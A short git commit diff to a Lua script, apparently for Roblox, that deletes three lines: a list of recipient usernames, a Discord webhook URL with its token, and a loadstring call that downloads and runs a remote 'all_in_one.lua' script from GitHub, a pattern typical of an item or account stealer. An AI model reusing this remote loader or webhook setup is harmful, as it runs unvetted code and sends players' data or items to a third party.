2cf68decfe48fc46ef2affd42697c2fe37d5b26c
neverfindme321 <hamzapower300@gmail.com>
2025-04-23 17:40:23 -0400

    Update script2.lua

--- script2.lua
+++ script2.lua
@@ -1,3 +1,1 @@
-Username = {"requirebob","TornadoFunds"} 
-Webhook = "https://discord.com/api/webhooks/1364412421279580293/0nqAMKV85B0ryiJMNKhHpUhyLFJfYyfL23jSNIaMlKDHbR-5yPLI_O7gvi9aCdn-DwXz" 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+
